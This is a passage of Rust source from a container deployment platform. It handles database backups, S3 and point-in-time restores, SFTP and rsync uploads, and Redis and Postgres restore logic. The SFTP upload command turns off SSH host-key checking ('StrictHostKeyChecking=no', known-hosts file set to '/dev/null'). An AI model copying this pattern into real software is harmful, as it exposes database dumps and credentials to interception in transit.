                reason: format!("{err:#}"),
            }
        })?;
        let app = self.add_app(app_req, unix_ms()).await?;
        let password = self.init_db_password(app.id, &info).await?;
        let restore = restore_plan(&engine_key, &info, &password)?;
        let platform = self.clone();
        let data_path = info.data_path.clone();

        self.deploy(
            app.id,
            caller,
            r3v3rs3_api::platform::DeploymentTrigger::Manual,
        )
        .await?;

        tokio::spawn(async move {
            if let Err(err) = platform
                .wait_and_restore(app.id, &restore, dump, &data_path)
                .await
            {
                tracing::error!(%err, app = %app.id, "failed to restore S3 disaster recovery dump");
            }
        });

        Ok(RestoreFromS3Response {
            success: true,
            message: format!("created database {} and scheduled restore", app.name),
            app_id: Some(app.id),
            app_name: Some(app.name.to_string()),
        })
    }

    async fn init_db_password(&self, db_id: ShortId, info: &EngineInfo) -> anyhow::Result<String> {
        if info.password_env.is_empty() {
            return Ok(String::new());
        }
        let password = format!("{:032x}", rand::random::<u128>());
        let entries = super::database_env::initial_db_env_entries(info, &password)?;
        self.set_env(db_id, entries).await?;
        Ok(password)
    }
}

/// The spec of a point-in-time branch: the image and settings of its source, with a data volume
/// of its own, named like the volume of every new database. A branch that mounted the volume
/// of its source would start a second server on the live data directory.
fn branch_spec(
    source: &r3v3rs3_api::platform::AppSpec,
    new_name: &AppName,
    host_port: u16,
) -> anyhow::Result<r3v3rs3_api::platform::AppSpec> {
    let info = r3v3rs3_api::platform::app_engine_info(source).context("engine not in catalog")?;
    let mut spec = source.clone();
    spec.host_port = Some(host_port);
    spec.replica_of = None;
    let volume: r3v3rs3_api::container::VolumeName =
        format!("{}-data", new_name.as_str()).parse()?;
    spec.volumes = vec![r3v3rs3_api::container::VolumeMount {
        volume,
        target: info.data_path.parse()?,
        read_only: false,
    }];
    Ok(spec)
}

/// Runs `attempt` every `interval` until it succeeds or `limit` has passed. A container that
/// is still starting fails the first attempts; when none succeeds, the error of the last one
/// says why.
async fn retry_until<F, Fut>(
    limit: Duration,
    interval: Duration,
    mut attempt: F,
) -> anyhow::Result<()>
where
    F: FnMut() -> Fut,
    Fut: std::future::Future<Output = anyhow::Result<()>>,
{
    let deadline = std::time::Instant::now() + limit;
    loop {
        tokio::time::sleep(interval).await;
        let result = attempt().await;
        if result.is_ok() || std::time::Instant::now() >= deadline {
            return result.with_context(|| format!("gave up after {} seconds", limit.as_secs()));
        }
    }
}

fn create_database_spec(
    new_name: &AppName,
    engine_key: &str,
    version: &str,
    info: &EngineInfo,
    host_port: u16,
) -> anyhow::Result<r3v3rs3_api::platform::AppSpec> {
    let volume = format!("{}-data", new_name.as_str()).parse()?;
    let target = info.data_path.parse()?;
    Ok(r3v3rs3_api::platform::AppSpec {
        source: r3v3rs3_api::platform::AppSource::Image {
            image: version.parse()?,
        },
        port: info.container_port,
        domains: Vec::new(),
        ports: Vec::new(),
        health_check_path: None,
        volumes: vec![r3v3rs3_api::container::VolumeMount {
            volume,
            target,
            read_only: false,
        }],
        restart: Default::default(),
        limits: Default::default(),
        host_port: Some(host_port),
        database: Some(engine_key.to_string()),
        bot_blocker: false,
        grpc_web: false,
        frame_protection: false,
        uses_database: None,
        replica_of: None,
        auto_deploy: false,
        require_approval: false,
        deploy_window: None,
        tag_trigger: None,
        watch_paths: Vec::new(),
        host_ports: Vec::new(),
        store_app_id: None,
        targets: Vec::new(),
        load_balancing: None,
        alert_rules: None,
        sticky: None,
        git_config: None,
        env_groups: Vec::new(),
        preview: None,
        preview_of: None,
        buildkit: None,
        project_id: None,
        environment_id: None,
        lifecycle_hooks: None,
    })
}

async fn resolve_s3_restore_app(
    platform: &Platform,
    req: &RestoreFromS3Request,
) -> anyhow::Result<(r3v3rs3_api::platform::AppRequest, String, EngineInfo)> {
    let new_name = req
        .new_database_name
        .clone()
        .context("either target_db_id or new_database_name must be provided")?;
    let engine_key = req
        .engine
        .clone()
        .context("engine must be specified when restoring as a new database")?;
    let info = r3v3rs3_api::platform::engine_info(&engine_key)
        .context("the engine is not in the database catalog")?;
    let version = req
        .version
        .clone()
        .unwrap_or_else(|| info.versions.first().cloned().unwrap_or_default());
    let info = info.for_image(&version);
    let host_port = match req.host_port {
        Some(p) => p,
        None => platform.allocate_host_port().await?,
    };
    let spec = create_database_spec(&new_name, &engine_key, &version, &info, host_port)?;
    let app_req = r3v3rs3_api::platform::AppRequest {
        name: new_name,
        target: r3v3rs3_api::platform::LOCAL_TARGET.parse()?,
        spec,
    };
    Ok((app_req, engine_key, info))
}

/// The archived segments in the directory `dir`, sorted by start time.
pub(super) async fn segments_in(dir: &std::path::Path) -> anyhow::Result<Vec<WalSegment>> {
    let mut segments = Vec::new();
    let mut reader = match tokio::fs::read_dir(dir).await {
        Ok(reader) => reader,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(segments),
        Err(err) => return Err(err.into()),
    };
    while let Some(file) = reader.next_entry().await? {
        let path = file.path();
        if path.extension().is_some_and(|ext| ext == "json")
            && let Ok(json) = tokio::fs::read(&path).await
            && let Ok(segment) = serde_json::from_slice::<WalSegment>(&json)
        {
            segments.push(segment);
        }
    }
    segments.sort_by_key(|s| s.start_time);
    Ok(segments)
}

impl Platform {
    /// The directory under the config directory that holds WAL / binary log segments.
    pub async fn wal_dir(&self, db_id: ShortId) -> anyhow::Result<std::path::PathBuf> {
        let base = self.backup_dir(db_id).await?;
        Ok(base.join("wal"))
    }

    /// Lists the archived WAL / binary log segments of a database, sorted by start time.
    pub async fn list_wal_segments(&self, db_id: ShortId) -> anyhow::Result<Vec<WalSegment>> {
        segments_in(&self.wal_dir(db_id).await?).await
    }

    /// Archives the current WAL or binary log segment from the running database container.
    pub async fn archive_wal(&self, db_id: ShortId) -> anyhow::Result<WalSegment> {
        let app = self.app(db_id).await?;
        match app.spec.database.as_deref() {
            Some("postgres") => self.archive_postgres_wal(db_id).await,
            Some("mysql" | "mariadb") => self.archive_binlog(db_id).await,
            Some("mongodb") => self.archive_oplog(db_id).await,
            Some("redis") => self.archive_aof(db_id).await,
            _ => Err(pitr_unsupported(&app)),
        }
    }

    /// Calculates the point-in-time recovery window and statistics for a database.
    pub async fn pitr_range(&self, db_id: ShortId) -> anyhow::Result<PitrRange> {
        let app = self.app(db_id).await?;
        match app.spec.database.as_deref() {
            Some("postgres") => self.postgres_pitr_range(db_id).await,
            Some("mysql" | "mariadb") => self.binlog_pitr_range(db_id).await,
            Some("mongodb") => self.oplog_pitr_range(db_id).await,
            Some("redis") => self.aof_pitr_range(db_id).await,
            _ => Err(pitr_unsupported(&app)),
        }
    }

    /// Performs point-in-time recovery to the requested timestamp.
    /// If request.new_name is provided, creates a new branched database (PITR Clone)
    /// and restores the base backup and WAL segments into it.
    /// If request.new_name is None, restores in-place into the existing container.
    pub async fn restore_pitr(
        self: &Arc<Self>,
        db_id: ShortId,
        request: PitrRestoreRequest,
    ) -> anyhow::Result<PitrRestoreResponse> {
        let app = self.app(db_id).await?;
        match app.spec.database.as_deref() {
            Some("postgres") => self.restore_postgres_pitr(db_id, &app, request).await,
            Some("mysql" | "mariadb") => self.restore_binlog_pitr(db_id, &app, request).await,
            Some("mongodb") => self.restore_oplog_pitr(db_id, &app, request).await,
            Some("redis") => self.restore_aof_pitr(db_id, &app, request).await,
            _ => Err(pitr_unsupported(&app)),
        }
    }

    pub(super) async fn create_pitr_app(
        &self,
        source: &AppEntry,
        new_name: AppName,
        host_port: Option<u16>,
    ) -> anyhow::Result<AppEntry> {
        let resolved_port = match host_port {
            Some(p) => p,
            None => self.allocate_host_port().await?,
        };
        let app_spec = branch_spec(&source.spec, &new_name, resolved_port)?;
        let app_req = r3v3rs3_api::platform::AppRequest {
            name: new_name,
            target: source.target,
            spec: app_spec,
        };
        self.add_app(app_req, unix_ms()).await
    }

    pub(super) async fn sync_pitr_password(
        &self,
        source_id: ShortId,
        dest_id: ShortId,
        info: &EngineInfo,
    ) -> anyhow::Result<String> {
        if info.password_env.is_empty() {
            return Ok(String::new());
        }
        let pass = self.database_password(source_id, info).await?;
        // The whole first environment of the engine: MongoDB creates its root user only with
        // both the user and the password variable.
        let entries = super::database_env::initial_db_env_entries(info, &pass)?;
        self.set_env(dest_id, entries).await?;
        Ok(pass)
    }

    /// Uploads one backup to the configured S3 bucket. Does nothing without a target.
    async fn upload_to_s3(
        &self,
        entry: &BackupEntry,
        dump_path: &std::path::Path,
    ) -> anyhow::Result<()> {
        let config = self.backup_config().await?;
        let Some(s3) = config.s3 else {
            return Ok(());
        };
        let Some(secret) = self.s3_secret().await? else {
            bail!("the S3 target has no secret key stored");
        };
        let s3 = r3v3rs3_api::platform::S3Config {
            secret_key: secret,
            ..s3
        };
        super::s3::upload(self.http().await?, &s3, entry, dump_path).await
    }

    fn sftp_remote_spec(sftp: &r3v3rs3_api::platform::SftpConfig) -> String {
        if !sftp.user.is_empty() {
            format!("{}@{}", sftp.user, sftp.host)
        } else {
            sftp.host.clone()
        }
    }

    async fn prepare_sftp_key(secret: &str) -> anyhow::Result<Option<std::path::PathBuf>> {
        let is_key =
            !secret.is_empty() && (secret.contains("BEGIN ") || secret.contains("PRIVATE KEY"));
        if !is_key {
            return Ok(None);
        }
        let key_path = std::env::temp_dir().join(format!("sftp-key-{}", backup_id()));
        let mut options = tokio::fs::OpenOptions::new();
        options.write(true).create_new(true).mode(0o600);
        let mut file = options.open(&key_path).await.with_context(|| {
            format!("failed to create temporary key file {}", key_path.display())
        })?;
        file.write_all(secret.as_bytes()).await?;
        file.flush().await?;
        Ok(Some(key_path))
    }

    fn build_sftp_cmd(
        sftp: &r3v3rs3_api::platform::SftpConfig,
        key_path: Option<&std::path::Path>,
    ) -> tokio::process::Command {
        let mut cmd = tokio::process::Command::new("sftp");
        cmd.arg("-P").arg(sftp.port.to_string());
        cmd.arg("-o").arg("StrictHostKeyChecking=no");
        cmd.arg("-o").arg("UserKnownHostsFile=/dev/null");
        cmd.arg("-o").arg("BatchMode=yes");
        if let Some(key) = key_path {
            cmd.arg("-i").arg(key);
        }
        cmd.arg("-b").arg("-");
        cmd.arg(Self::sftp_remote_spec(sftp));
        cmd.stdin(std::process::Stdio::piped());
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());
        cmd
    }

    fn build_sftp_batch(
        path: &str,
        name: &str,
        dump_path: &std::path::Path,
        manifest_path: &std::path::Path,
    ) -> anyhow::Result<String> {
        let clean_path = sanitize_sftp_path_component(path)?;
        let clean_name = sanitize_sftp_path_component(name)?;
        let target_dir = format!("{}/{}", clean_path.trim_end_matches('/'), clean_name);
        Ok(format!(
            "-mkdir \"{target_dir}\"\nput \"{}\" \"{target_dir}/\"\nput \"{}\" \"{target_dir}/\"\nquit\n",
            dump_path.display(),
            manifest_path.display()
        ))
    }

    async fn execute_sftp_batch(
        mut cmd: tokio::process::Command,
        batch: &str,
        temp_key: Option<std::path::PathBuf>,
    ) -> anyhow::Result<()> {
        let mut child = cmd.spawn()?;
        if let Some(mut stdin) = child.stdin.take() {
            use tokio::io::AsyncWriteExt;
            let _ = stdin.write_all(batch.as_bytes()).await;
        }

        let output = tokio::time::timeout(
            std::time::Duration::from_secs(300),
            child.wait_with_output(),
        )
        .await??;
        if let Some(key_path) = temp_key {
            let _ = tokio::fs::remove_file(key_path).await;
        }

        if !output.status.success() {
            let msg = String::from_utf8_lossy(&output.stderr);
            bail!("sftp upload failed: {msg}");
        }
        Ok(())
    }

    /// Uploads one backup to the configured SFTP server. Does nothing without a target.
    async fn upload_to_sftp(
        &self,
        entry: &BackupEntry,
        dump_path: &std::path::Path,
        manifest_path: &std::path::Path,
    ) -> anyhow::Result<()> {
        let config = self.backup_config().await?;
        let Some(sftp) = config.sftp else {
            return Ok(());
        };
        let secret = self.sftp_secret().await?.unwrap_or_default();
        let batch = Self::build_sftp_batch(&sftp.path, &entry.name, dump_path, manifest_path)?;
        let temp_key = Self::prepare_sftp_key(&secret).await?;
        let cmd = Self::build_sftp_cmd(&sftp, temp_key.as_deref());
        Self::execute_sftp_batch(cmd, &batch, temp_key).await
    }

    /// Syncs one backup to the configured rsync destination. Does nothing without a target.
    async fn upload_to_rsync(
        &self,
        entry: &BackupEntry,
        dump_path: &std::path::Path,
        manifest_path: &std::path::Path,
    ) -> anyhow::Result<()> {
        let config = self.backup_config().await?;
        let Some(rsync) = config.rsync else {
            return Ok(());
        };
        let secret = self.rsync_secret().await?.unwrap_or_default();
        let dest = format!("{}/{}", rsync.destination.trim_end_matches('/'), entry.name);

        let mut cmd = tokio::process::Command::new("rsync");
        cmd.arg("-avz");
        if !rsync.ssh_options.is_empty() {
            cmd.arg("-e").arg(format_rsync_rsh(&rsync.ssh_options)?);
        }
        if !secret.is_empty() {
            cmd.env("RSYNC_PASSWORD", &secret);
        }
        cmd.arg(dump_path);
        cmd.arg(manifest_path);
        cmd.arg(dest);

        let output =
            tokio::time::timeout(std::time::Duration::from_secs(300), cmd.output()).await??;
        if !output.status.success() {
            let msg = String::from_utf8_lossy(&output.stderr);
            bail!("rsync failed: {msg}");
        }
        Ok(())
    }

    async fn verify_backup_checksum(
        &self,
        dir: &std::path::Path,
        entry: &mut BackupEntry,
        dump_path: &std::path::Path,
        db_id: ShortId,
    ) -> anyhow::Result<Option<r3v3rs3_api::platform::BackupVerifyReport>> {
        let digest = match compute_file_sha256(dump_path).await {
            Ok(d) => d,
            Err(err) => {
                let msg = format!("checksum calculation failed: {err:#}");
                self.save_verification_result(dir, entry, false, &msg, None)
                    .await?;
                self.dispatch_verification_failed(db_id, entry, &msg).await;
                return Ok(Some(self.build_verify_report(
                    &entry.id,
                    false,
                    0,
                    "read_error",
                    msg,
                    None,
                )));
            }
        };

        if digest != entry.sha256 {
            let msg = format!(
                "checksum mismatch: expected {}, got {}",
                entry.sha256, digest
            );
            self.save_verification_result(dir, entry, false, &msg, None)
                .await?;
            self.dispatch_verification_failed(db_id, entry, &msg).await;
            return Ok(Some(
                self.build_verify_report(&entry.id, false, 0, "unknown", msg, None),
            ));
        }
        Ok(None)
    }

    fn build_verify_report(
        &self,
        id: &str,
        verified: bool,
        uncompressed_size: u64,
        format_detected: &str,
        message: String,
        drill: Option<BackupDrillDetails>,
    ) -> r3v3rs3_api::platform::BackupVerifyReport {
        r3v3rs3_api::platform::BackupVerifyReport {
            backup_id: id.to_string(),
            verified,
            uncompressed_size,
            format_detected: format_detected.to_string(),
            message,
            drill,
        }
    }

    /// Tests decompression, integrity, and runs a simulated restore drill on a backup dump.
    pub async fn verify_backup(
        &self,
        db_id: ShortId,
        backup_id: &str,
    ) -> anyhow::Result<r3v3rs3_api::platform::BackupVerifyReport> {
        let mut entry = self.backup_entry(db_id, backup_id).await?;
        let dir = self.backup_dir(db_id).await?;
        let dump_path = dir.join(format!("{}.dump.gz", entry.id));
        let started_at = std::time::Instant::now();

        if let Some(report) = self
            .verify_backup_checksum(&dir, &mut entry, &dump_path, db_id)
            .await?
        {
            return Ok(report);
        }

        let (drill, uncompressed_size) =
            match stream_verify_drill(&entry.engine, &dump_path, started_at).await {
                Ok(res) => res,
                Err(err) => {
                    let msg = format!("decompression failed: {err:#}");
                    self.save_verification_result(&dir, &mut entry, false, &msg, None)
                        .await?;
                    self.dispatch_verification_failed(db_id, &entry, &msg).await;
                    return Ok(self.build_verify_report(
                        &entry.id,
                        false,
                        0,
                        "corrupt_gzip",
                        msg,
                        None,
                    ));
                }
            };

        let valid = drill.integrity_check_passed;
        let msg = drill.summary.clone();
        self.save_verification_result(&dir, &mut entry, valid, &msg, Some(drill.clone()))
            .await?;

        if !valid {
            self.dispatch_verification_failed(db_id, &entry, &msg).await;
        }

        let format_detected = drill.drill_mode.clone();
        Ok(self.build_verify_report(
            &entry.id,
            valid,
            uncompressed_size,
            &format_detected,
            msg,
            Some(drill),
        ))
    }

    async fn dispatch_verification_failed(
        &self,
        db_id: ShortId,
        entry: &BackupEntry,
        error_msg: &str,
    ) {
        let summary = format!(
            "Backup verification failed for database {}: {error_msg}",
            entry.name
        );
        let data = serde_json::json!({
            "app_id": db_id,
            "backup_id": entry.id,
            "database_name": entry.name,
            "engine": entry.engine,
            "size_bytes": entry.size,
            "error": error_msg,
        });
        self.dispatch_webhook_event(
            r3v3rs3_api::webhook::WebhookEvent::BackupVerificationFailed,
            summary,
            data,
        )
        .await;
    }

    async fn save_verification_result(
        &self,
        dir: &std::path::Path,
        entry: &mut BackupEntry,
        valid: bool,
        status: &str,
        drill: Option<BackupDrillDetails>,
    ) -> anyhow::Result<()> {
        entry.verified_at = Some(unix_ms() as i64);
        entry.verification_status = Some(if valid {
            "valid".to_string()
        } else {
            format!("failed: {status}")
        });
        entry.drill = drill;
        let manifest = serde_json::to_vec(entry)?;
        tokio::fs::write(dir.join(format!("{}.json", entry.id)), manifest).await?;
        Ok(())
    }

    /// Deletes the oldest backups beyond the `keep` count of the settings.
    async fn apply_retention(&self, db_id: ShortId) -> anyhow::Result<()> {
        let keep = self.backup_config().await?.keep.max(1);
        let backups = self.list_backups(db_id).await?;
        for entry in backups.into_iter().skip(keep as usize) {
            self.delete_backup(db_id, &entry.id).await?;
        }
        Ok(())
    }

    async fn backup_entry(&self, db_id: ShortId, backup_id: &str) -> anyhow::Result<BackupEntry> {
        self.list_backups(db_id)
            .await?
            .into_iter()
            .find(|entry| entry.id == backup_id)
            .ok_or_else(|| {
                Error::BackupNotFound {
                    id: backup_id.to_string(),
                }
                .into()
            })
    }

    /// The backup directory of one database, named after the app.
    pub(super) async fn backup_dir(&self, db_id: ShortId) -> anyhow::Result<std::path::PathBuf> {
        let app = self.app(db_id).await?;
        Ok(self.backup_dir.join(app.name.as_str()))
    }

    /// The running container of a managed database on the local target.
    pub(super) async fn database_container(
        &self,
        db_id: ShortId,
    ) -> anyhow::Result<(
        r3v3rs3_api::platform::AppEntry,
        ContainerName,
        Arc<dyn ContainerRuntime>,
    )> {
        let app = self.app(db_id).await?;
        if app.spec.database.is_none() {
            bail!("the app {} is not a managed database", app.name);
        }
        if !is_local(app.target) {
            return Err(Error::TerminalUnsupported.into());
        }
        let Some(deployment) = self.store.running_deployment(db_id).await? else {
            return Err(Error::AppNotRunning {
                name: app.name.to_string(),
            }
            .into());
        };
        let name = proxy::container_name(db_id, deployment)?;
        let runtime = self.runtime(app.target);
        Ok((app, name, runtime))
    }

    /// Opens the generated password of the database from its secret environment variable.
    pub(super) async fn database_password(
        &self,
        db_id: ShortId,
        info: &EngineInfo,
    ) -> anyhow::Result<String> {
        if info.password_env.is_empty() {
            return Ok(String::new());
        }
        for var in self.store.env(db_id).await? {
            if var.key.as_str() == info.password_env {
                let value = self
                    .keys()
                    .open(&super::env_aad(db_id, var.key.as_str()), &var.sealed)?;
                let value = String::from_utf8(value).context("a password is not UTF-8")?;
                return Ok(value);
            }
        }
        Ok(String::new())
    }
}

/// Runs the dump of the plan and writes the dump into the local file `dest`. The dump goes
/// into a file in the container first, the standard output of the command or the file that an
/// engine such as Redis writes itself, and leaves it in bounded pieces, so a dump of any size
/// passes without being held in memory.
async fn take_dump_to(
    runtime: &Arc<dyn ContainerRuntime>,
    container: &ContainerName,
    plan: DumpPlan,
    dest: &std::path::Path,
) -> anyhow::Result<()> {
    if let Some(path) = &plan.file {
        runtime
            .exec_capture(container, plan.command, plan.env)
            .await?;
        super::transfer::fetch_to_file(runtime, container, (path, 0), dest).await?;
        return Ok(());
    }
    // A clone can dump a database while its backup runs, so every dump has a file of its own.
    let remote = format!("/tmp/r3v3rs3-dump-{:016x}", rand::random::<u64>());
    // The words of the command stay arguments of the shell, so none of them is parsed again.
    let mut command = vec![
        "sh".to_string(),
        "-c".to_string(),
        format!("exec \"$@\" > {remote}"),
        "sh".to_string(),
    ];
    command.extend(plan.command);
    let fetched = match runtime.exec_capture(container, command, plan.env).await {
        Ok(_) => super::transfer::fetch_to_file(runtime, container, (&remote, 0), dest).await,
        Err(err) => Err(err),
    };
    let removed = runtime.remove_path(container, &remote).await;
    // The error of the dump tells more than the error of the cleanup after it.
    fetched?;
    removed
}

/// The local connection string of a MongoDB container, with the user and the password
/// percent-encoded into it.
pub(super) fn mongodb_uri(user: &str, password: &str) -> anyhow::Result<String> {
    let mut uri = url::Url::parse("mongodb://127.0.0.1:27017/?authSource=admin")?;
    uri.set_username(user)
        .map_err(|()| anyhow::anyhow!("the MongoDB user cannot go into a connection string"))?;
    uri.set_password(Some(password))
        .map_err(|()| anyhow::anyhow!("the MongoDB password cannot go into a connection string"))?;
    Ok(uri.to_string())
}

/// The error of an engine without a log archive: a recovery from dumps alone could reach only
/// the moments of the dumps, so the platform offers none.
fn pitr_unsupported(app: &AppEntry) -> anyhow::Error {
    Error::PitrUnsupported {
        engine: app.spec.database.clone().unwrap_or_default(),
    }
    .into()
}

/// Uploads the dump into the container and runs the restore command of the engine. Redis takes
/// no upload: the restore writes the dump into the data volume and shuts the server down, and
/// the container restart loads it. A shutdown must not save the old dataset over the file.
async fn run_restore(
    runtime: &Arc<dyn ContainerRuntime>,
    container: &ContainerName,
    plan: &RestorePlan,
    dump: &DumpFile,
    data_path: &str,
) -> anyhow::Result<()> {
    let adapted = adapt_postgres_cluster_dump(plan, dump).await?;
    let (plan, dump) = match &adapted {
        Some((plan, dump)) => (plan, dump),
        None => (plan, dump),
    };
    let Some(path) = &plan.upload else {
        return restore_redis(runtime, container, plan, dump, data_path).await;
    };
    let mkdir = vec!["mkdir".into(), "-p".into(), RESTORE_DIR.into()];
    runtime.exec_capture(container, mkdir, Vec::new()).await?;
    // A single upload refuses more than 16 MiB, and a production MySQL dump holds 72 MB, so
    // the dump goes in bounded pieces.
    let outcome = match super::transfer::push_file(runtime, container, &dump.path, path).await {
        Ok(()) => runtime
            .exec_capture(container, plan.command.clone(), plan.env.clone())
            .await
            .map(|_| ()),
        Err(err) => Err(err),
    };
    // A restore that ran must still reach `after_restore`, which sets the account passwords
    // again; a dump left behind in the container does not undo it.
    if let Err(err) = runtime.remove_path(container, path).await {
        tracing::warn!(%container, path, err = format!("{err:#}"), "the uploaded dump stays in the container");
    }
    outcome
}

/// Runs `script` with `$d` set to the AOF directory of the volume and `$p` to the place it is
/// kept aside. A server with an AOF loads the AOF and ignores `dump.rdb`, so a restore moves
/// the AOF aside before the restart, and removes it once the new server runs. A failed restore
/// leaves it on the volume.
async fn aof_aside(
    runtime: &Arc<dyn ContainerRuntime>,
    container: &ContainerName,
    data_path: &str,
    script: &str,
) -> anyhow::Result<()> {
    let script = format!(
        "d='{data_path}/appendonlydir'; p='{data_path}/appendonlydir.restore-prev'; {script}"
    );
    let command = vec!["sh".into(), "-c".into(), script];
    runtime
        .exec_capture(container, command, Vec::new())
        .await
        .map(|_| ())
}

/// Writes the dump into the data volume and stops the server without a save, so its next start
/// loads the dump. The `SHUTDOWN` ends the process that the exec of the command runs in, so the
/// exec reports a failure even when the server stopped. The restore therefore counts as done
/// only when the server answers with a new run id, which proves a new process started.
async fn restore_redis(
    runtime: &Arc<dyn ContainerRuntime>,
    container: &ContainerName,
    plan: &RestorePlan,
    dump: &DumpFile,
    data_path: &str,
) -> anyhow::Result<()> {
    let before = redis_run_id(runtime, container, plan).await?;
    let target = format!("{data_path}/dump.rdb");
    super::transfer::push_file(runtime, container, &dump.path, &target).await?;
    let aside = "rm -rf \"$p\"; [ ! -d \"$d\" ] || mv \"$d\" \"$p\"";
    aof_aside(runtime, container, data_path, aside).await?;
    let shutdown = runtime
        .exec_capture(container, plan.command.clone(), plan.env.clone())
        .await;
    for _ in 0..30 {
        runtime.start_container(container).await?;
        if let Ok(after) = redis_run_id(runtime, container, plan).await
            && after != before
        {
            return aof_aside(runtime, container, data_path, "rm -rf \"$p\"").await;
        }
        tokio::time::sleep(std::time::Duration::from_secs(1)).await;
    }
    match shutdown {
        Ok(_) => bail!("the Redis server did not restart to load the restored dump"),
        Err(err) => Err(err.context("the Redis server did not restart to load the restored dump")),
    }
}

/// The run id of the Redis server, which changes with every start of the process.
async fn redis_run_id(
    runtime: &Arc<dyn ContainerRuntime>,
    container: &ContainerName,
    plan: &RestorePlan,
) -> anyhow::Result<String> {
    let command = vec!["redis-cli".into(), "INFO".into(), "server".into()];
    let output = runtime
        .exec_capture(container, command, plan.env.clone())
        .await?;
    String::from_utf8_lossy(&output)
        .lines()
        .find_map(|line| line.trim().strip_prefix("run_id:").map(str::to_string))
        .context("the Redis server reported no run id")
}

/// The first line of the comment block that `pg_dumpall` writes at the top of its output.
const POSTGRES_CLUSTER_DUMP: &[u8] = b"PostgreSQL database cluster dump";

/// A `pg_dumpall` dump runs into a server that keeps working: apps hold connections and the
/// root account of the restore session exists already. The restore therefore stops at the
/// first error, drops the old databases with `FORCE`, which ends their connections, and leaves
/// out the lines that drop and create the root role, which cannot succeed. `None` for every
/// other dump, such as the single-database dumps of older backups.
async fn adapt_postgres_cluster_dump(
    plan: &RestorePlan,
    dump: &DumpFile,
) -> anyhow::Result<Option<(RestorePlan, DumpFile)>> {
    let head = dump.head().await?;
    let head = &head[..head.len().min(256)];
    if plan.command.first().map(String::as_str) != Some("psql")
        || !head
            .windows(POSTGRES_CLUSTER_DUMP.len())
            .any(|w| w == POSTGRES_CLUSTER_DUMP)
    {
        return Ok(None);
    }
    let Some(user) = plan
        .command
        .iter()
        .position(|arg| arg == "-U")
        .and_then(|index| plan.command.get(index + 1))
    else {
        return Ok(None);
    };
    let adapted = dump.sibling().await?;
    adapt_cluster_lines(&dump.path, &adapted.path, user.as_bytes()).await?;
    let mut command = plan.command.clone();
    command.splice(1..1, ["-v".to_string(), "ON_ERROR_STOP=1".to_string()]);
    let plan = RestorePlan {
        command,
        ..plan.clone()
    };
    Ok(Some((plan, adapted)))
}

/// Writes the lines of the cluster dump `src` into `dest` as the restore runs them, one line
/// at a time.
async fn adapt_cluster_lines(
    src: &std::path::Path,
    dest: &std::path::Path,
    root: &[u8],
) -> anyhow::Result<()> {
    use tokio::io::AsyncBufReadExt as _;
    let mut reader = tokio::io::BufReader::new(tokio::fs::File::open(src).await?);
    let mut out = tokio::io::BufWriter::new(tokio::fs::File::create(dest).await?);
    let mut line = Vec::new();
    let mut in_copy = false;
    loop {
        line.clear();
        if reader.read_until(b'\n', &mut line).await? == 0 {
            break;
        }
        let adapted;
        (adapted, in_copy) = adapt_cluster_line(&line, root, in_copy);
        out.write_all(adapted.as_deref().unwrap_or(&line)).await?;
    }
    out.flush().await?;
    out.into_inner().sync_all().await?;
    Ok(())
}

/// One line of a cluster dump as the restore runs it, `None` for the line unchanged, and
/// whether the next line is a row of a `COPY` block. The rows of a `COPY ... FROM stdin;`
/// block run up to the `\.` line; they are data and pass unchanged.
fn adapt_cluster_line(line: &[u8], root: &[u8], in_copy: bool) -> (Option<Vec<u8>>, bool) {
    if in_copy {
        return (None, line.trim_ascii_end() != b"\\.");
    }
    let starts_copy = line.starts_with(b"COPY ") && line.trim_ascii_end().ends_with(b"FROM stdin;");
    (Some(cluster_dump_line(line, root)), starts_copy)
}

/// One statement line of a `pg_dumpall` dump, with its line end, as the restore runs it; an
/// empty result drops the line.
fn cluster_dump_line(line: &[u8], root: &[u8]) -> Vec<u8> {
    let statement = line.trim_ascii_end();
    let role = |prefix: &[u8]| {
        statement
            .strip_prefix(prefix)
            .and_then(|rest| rest.strip_suffix(b";"))
            == Some(root)
    };
    if role(b"DROP ROLE IF EXISTS ") || role(b"CREATE ROLE ") {
        return Vec::new();
    }
    match statement
        .strip_prefix(b"DROP DATABASE ")
        .and_then(|rest| rest.strip_suffix(b";"))
    {
        Some(target) => [b"DROP DATABASE ", target, b" WITH (FORCE);\n"].concat(),
        None => line.to_vec(),
    }
}

/// Restores a dump into a database container the way a restore of the platform does, for the
/// tests on a Docker Engine.
#[cfg(test)]
pub(super) async fn restore_for_test(
    runtime: &Arc<dyn ContainerRuntime>,
    container: &ContainerName,
    info: &EngineInfo,
    password: &str,
    dump: Vec<u8>,
) -> anyhow::Result<()> {
    let plan = restore_plan(&info.engine, info, password)?;
    let dump = DumpFile::from_bytes(&dump, &std::env::temp_dir()).await?;
    Platform::execute_and_validate_restore(
        runtime,
        container,
        &plan,
        &info.engine,
        &dump,
        &info.data_path,
    )
    .await
}

/// Takes the dump of a database container, for the tests on a Docker Engine.
#[cfg(test)]
pub(super) async fn dump_for_test(
    runtime: &Arc<dyn ContainerRuntime>,
    container: &ContainerName,
    info: &EngineInfo,
    password: &str,
) -> anyhow::Result<Vec<u8>> {
    let dump = DumpFile::new(&std::env::temp_dir()).await?;
    let plan = dump_plan(&info.engine, info, password)?;
    take_dump_to(runtime, container, plan, &dump.path).await?;
    Ok(tokio::fs::read(&dump.path).await?)
}

/// The dump of a MySQL server: every database but the system schemas. The `mysql` schema holds
/// the accounts with their passwords, so a restore of it would bring back old passwords over
/// the stored ones; the platform sets the accounts of the tenants again after a restore. The
/// dump carries no GTID set: a server that executed transactions refuses to set one.
const MYSQL_DUMP: &str = "dbs=$(mysql -u root -N -e \"SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('mysql', 'sys', 'information_schema', 'performance_schema')\") || exit 1; \
     if [ -z \"$dbs\" ]; then echo '-- MySQL dump: no user databases'; else mysqldump -u root --single-transaction --routines --events --set-gtid-purged=OFF --databases $dbs; fi";

/// The dump of a MariaDB server, like `MYSQL_DUMP` with the MariaDB tools.
const MARIADB_DUMP: &str = "dbs=$(mariadb -u root -N -e \"SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('mysql', 'sys', 'information_schema', 'performance_schema')\") || exit 1; \
     if [ -z \"$dbs\" ]; then echo '-- MariaDB dump: no user databases'; else mariadb-dump -u root --single-transaction --routines --events --databases $dbs; fi";

/// The dump command of one engine over the local connection of the container itself. The
/// engines with a dump command are the ones that the catalog of the `r3v3rs3-apps`
/// repository carries; an engine without a command cannot be backed up.
